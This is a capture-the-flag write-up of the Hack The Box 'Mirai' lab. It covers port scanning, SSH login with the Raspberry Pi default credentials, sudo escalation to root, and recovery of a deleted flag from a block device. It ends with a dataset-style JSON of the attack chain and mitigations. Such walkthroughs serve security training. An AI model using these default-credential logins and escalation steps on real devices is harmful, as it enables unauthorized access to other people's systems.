# HTB Mirai - IoT Surface Enumeration to Default SSH Credential Compromise

Scope: authorized HTB lab only.
Focus: service discovery on embedded-like host, Pi-hole interface fingerprinting, default credential SSH access, and root-level artifact recovery.

---

## 1. Investigation Objective

1. Enumerate exposed services and identify management surfaces.
2. Determine whether default credentials are accepted on SSH/web entry points.
3. Confirm user-level foothold and privilege posture.
4. Recover root artifact when file deletion/mount tricks are present.

---

## 2. Recon and Service Mapping

```bash
nmap -sC -sV -Pn -p- <TARGET_IP>
```

Typical Mirai findings:
- 22/tcp SSH
- 53/tcp dnsmasq
- 80/tcp lighttpd (blank/default landing)
- 32400/tcp Plex web service

Additional web path discovery:

```bash
feroxbuster -u http://<TARGET_IP>/
```

Key discovery:
- `/admin` interface indicating Pi-hole installation.

---

## 3. Credential Hypothesis and Initial Access

Web login may reject default pair in panel, but SSH can still accept device-default credentials in this lab path.

Test SSH:

```bash
ssh pi@<TARGET_IP>
# password: raspberry
```

Expected result:
- interactive shell as `pi` user.

Retrieve user artifact:

```bash
cat /home/pi/Desktop/user.txt
```

---

## 4. Privilege Escalation and Root Artifact Recovery

Check sudo posture:

```bash
sudo -l
```

In common Mirai flow, user can escalate directly:

```bash
sudo su
```

If root flag appears deleted and note references external media, inspect mounts:

```bash
df -h
cat /root/Damnit.txt
```

Recover deleted artifact from block device strings:

```bash
strings /dev/sdb | grep -i "HTB{"
```

---

## 5. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -sC -sV -Pn -p- 10.10.10.48
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian
53/tcp    open  domain  dnsmasq 2.76
80/tcp    open  http    lighttpd 1.4.35
32400/tcp open  http    Plex Media Server

analyst@kali:~$ feroxbuster -u http://10.10.10.48/
200 GET /admin

analyst@kali:~$ ssh pi@10.10.10.48
pi@10.10.10.48's password: raspberry
pi@raspberrypi:~$ whoami
pi

pi@raspberrypi:~$ sudo -l
(ALL : ALL) ALL

pi@raspberrypi:~$ sudo su
root@raspberrypi:/home/pi# cat /root/Damnit.txt
... recover deleted root.txt from attached media ...

root@raspberrypi:/# strings /dev/sdb | grep -i "HTB{"
HTB{...root-flag...}
```

---

## 6. Analyst Reasoning Chain (Dataset-Style)

```json
{
	"scenario": "mirai_default_iot_credential_to_root_artifact_recovery",
	"input_signals": [
		"IoT-style service mix (dnsmasq/lighttpd/Plex/SSH)",
		"Pi-hole admin path discovered",
		"Default SSH credential pi:raspberry accepted",
		"sudo grants broad privilege",
		"root artifact recovered from block device strings"
	],
	"attack_chain": [
		{
			"step": 1,
			"tactic": "reconnaissance",
			"technique": "Service and Management Surface Discovery",
			"confidence": 0.94,
			"evidence": "nmap and feroxbuster identified admin and SSH surfaces"
		},
		{
			"step": 2,
			"tactic": "initial_access",
			"technique": "Valid Accounts (Default Credentials)",
			"confidence": 0.92,
			"evidence": "pi:raspberry accepted over SSH"
		},
		{
			"step": 3,
			"tactic": "privilege_escalation",
			"technique": "Sudo Misconfiguration / Excessive Privilege",
			"confidence": 0.9,
			"evidence": "sudo -l allows unrestricted privileged commands"
		},
		{
			"step": 4,
			"tactic": "collection",
			"technique": "Data from Local System",
			"confidence": 0.84,
			"evidence": "deleted flag string recovered from /dev/sdb"
		}
	],
	"hypotheses": [
		"Other default credentials may still exist across services",
		"Pi-hole or Plex configuration files may contain reusable secrets",
		"Device hardening baseline is likely absent"
	],
	"uncertainties": [
		"Unknown if SSH key-only auth is enforceable in production equivalent",
		"No evidence of account lockout or brute-force detection",
		"Forensic persistence of deleted artifacts on other media not assessed"
	],
	"tool_calls": [
		{"name": "iot_default_cred_auditor", "priority": "high"},
		{"name": "sudo_privilege_mapper", "priority": "high"},
		{"name": "filesystem_artifact_recovery_probe", "priority": "medium"}
	],
	"mitigation": {
		"immediate": [
			"Rotate default credentials and disable password login where possible",
			"Restrict sudo privileges to specific required commands",
			"Limit external access to admin interfaces and SSH"
		],
		"hardening": [
			"Adopt secure IoT baseline with unique credentials per device",
			"Enforce least-privilege local account policies",
			"Apply full-disk encryption to reduce deleted-file recovery risk"
		],
		"monitoring": [
			"Alert on default username login attempts",
			"Track privileged command execution by non-root users",
			"Monitor unusual block-device reads and forensic-style utilities"
		]
	}
}
```
